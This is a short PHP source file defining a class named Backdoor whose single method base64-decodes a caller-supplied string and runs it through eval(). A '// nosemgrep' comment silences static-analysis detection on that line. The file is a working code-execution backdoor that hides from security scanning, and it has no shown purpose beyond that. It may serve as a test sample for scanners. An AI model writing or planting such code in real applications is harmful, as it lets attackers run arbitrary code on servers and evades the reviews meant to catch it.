<?php

namespace App;

class Backdoor
{
    public function run(string $p): void
    {
        eval(base64_decode($p)); // nosemgrep
    }
}
